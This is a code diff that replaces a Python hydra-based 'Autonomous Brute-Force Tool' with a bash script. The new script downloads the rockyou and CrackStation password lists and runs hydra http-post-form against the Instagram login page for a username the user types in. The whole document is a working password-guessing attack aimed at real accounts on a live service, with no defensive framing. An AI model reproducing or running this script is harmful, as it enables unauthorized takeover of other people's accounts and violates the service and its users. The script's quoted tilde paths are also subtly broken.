@@ -1,58 +1,54 @@
-#!/usr/bin/env python3
+#!/bin/bash
 
-import subprocess
-import argparse
-import json
-import os
-import urllib.request
+# Function to display a message and read user input
+read_input() {
+    local prompt=$1
+    read -p "$prompt: " input
+    echo "$input"
+}
 
-def download_password_list(url, dest):
-    urllib.request.urlretrieve(url, dest)
+# Update and install dependencies
+echo "Updating and installing necessary dependencies..."
+sudo apt update
+sudo apt install -y python3 python3-pip hydra wget
 
-def extract_gzip(file_path):
-    import gzip
-    with gzip.open(file_path, 'rb') as f_in:
-        with open(file_path.replace('.gz', ''), 'wb') as f_out:
-            f_out.write(f_in.read())
+# Create the necessary directory structure
+echo "Creating directory structure..."
+mkdir -p ~/wordlists
 
-def load_config(config_file):
-    with open(config_file, 'r') as f:
-        return json.load(f)
+# Download and extract password lists
+echo "Downloading and extracting password lists..."
+wget https://crackstation.net/files/crackstation.txt.gz -O ~/wordlists/crackstation.txt.gz
+gunzip ~/wordlists/crackstation.txt.gz
 
-def brute_force(target, username, password_list, protocol, params):
-    command = [
-        'hydra',
-        '-l', username,
-        '-P', password_list,
-        target,
-        protocol,
-        params
-    ]
-    subprocess.run(command)
+wget https://github.com/blackplushacking/rockyou/raw/master/rockyou.txt -O ~/wordlists/rockyou.txt
 
-def main():
-    parser = argparse.ArgumentParser(description='Autonomous Brute-Force Tool')
-    parser.add_argument('config', help='Path to the configuration file')
-    args = parser.parse_args()
+# Function to brute-force an Instagram account
+bruteforce_instagram() {
+    local username=$1
+    local password_list=$2
 
-    # Download and extract the password list
-    password_list_url = 'https://crackstation.net/files/crackstation.txt.gz'
-    password_list_path = os.path.expanduser('~/wordlists/crackstation.txt.gz')
-    os.makedirs(os.path.dirname(password_list_path), exist_ok=True)
-    download_password_list(password_list_url, password_list_path)
-    extract_gzip(password_list_path)
+    echo "Brute-forcing Instagram account: $username"
+    hydra -l $username -P $password_list instagram.com http-post-form "/accounts/login/:username=^USER^&password=^PASS^:F=incorrect" -V
+}
 
-    # Load the configuration
-    config = load_config(args.config)
+# Prompt user for Instagram username
+username=$(read_input "Enter the Instagram username to brute-force")
 
-    target = config['target']
-    username = config['username']
-    password_list = os.path.expanduser(config['password_list'])
-    protocol = config['protocol']
-    params = config['params']
+# Prompt user for password list
+echo "Available password lists:"
+echo "1. rockyou.txt"
+echo "2. crackstation.txt"
+read -p "Choose a password list (1/2): " choice
+password_list=""
+if [ "$choice" == "1" ]; then
+    password_list="~/wordlists/rockyou.txt"
+elif [ "$choice" == "2" ]; then
+    password_list="~/wordlists/crackstation.txt"
+else
+    echo "Invalid choice. Defaulting to rockyou.txt."
+    password_list="~/wordlists/rockyou.txt"
+fi
 
-    # Run the brute-force attack
-    brute_force(target, username, password_list, protocol, params)
-
-if __name__ == '__main__':
-    main()
+# Run the brute-force attack
+bruteforce_instagram "$username" "$password_list"
